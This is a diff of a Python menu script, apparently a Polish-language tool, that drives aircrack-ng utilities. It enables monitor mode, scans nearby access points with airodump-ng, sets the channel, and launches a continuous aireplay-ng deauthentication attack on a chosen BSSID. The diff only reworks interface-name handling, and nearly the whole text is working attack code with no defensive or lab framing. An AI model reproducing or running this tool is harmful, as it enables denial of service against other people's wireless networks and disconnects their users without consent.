@@ -14,21 +14,20 @@ def start_monitor_mode(interface_name):
     os.system(f"sudo airmon-ng start {interface_name}")
 
 def capture_bssid(interface_name):
-    interface_name_mon = get_active_interface()
-    os.system(f"sudo timeout 5 airodump-ng {interface_name_mon} > airodump.txt")
+    os.system(f"sudo timeout 5 airodump-ng {interface_name} > airodump.txt")
     os.system("grep -E '([[:xdigit:]]{2}:){5}[[:xdigit:]]{2}' airodump.txt | awk '$6 ~ /^[1-9][0-9]*$/ && $11 !~ /^</ {print $1, $6, $11}' | sort | uniq > bssid.txt")
     os.system("rm airodump.txt")
     with open("bssid.txt", "r") as file:
         print(file.read())
 
 def set_channel(interface_name, channel):
-    os.system(f"sudo iw {interface_name}mon set channel {channel}")
+    os.system(f"sudo iw {interface_name} set channel {channel}")
 
 def deauth_attack(interface_name, bssid):
-    os.system(f"sudo aireplay-ng --deauth 0 -a {bssid} {interface_name}mon")
+    os.system(f"sudo aireplay-ng --deauth 0 -a {bssid} {interface_name}")
 
-def stop_monitor_mode(interface_name_mon):
-    os.system(f"sudo airmon-ng stop {interface_name_mon}")
+def stop_monitor_mode(interface_name):
+    os.system(f"sudo airmon-ng stop {interface_name}")
     os.system("sudo systemctl restart NetworkManager")
 
 def main():
@@ -56,8 +55,7 @@ def main():
             deauth_attack(interface_name, bssid)
             press_to_continue()
         elif choice == "0":
-            interface_name_mon = get_active_interface()
-            stop_monitor_mode(interface_name_mon)
+            stop_monitor_mode(interface_name)
             os.system("rm bssid.txt")
             print("Wyjście.")
             break
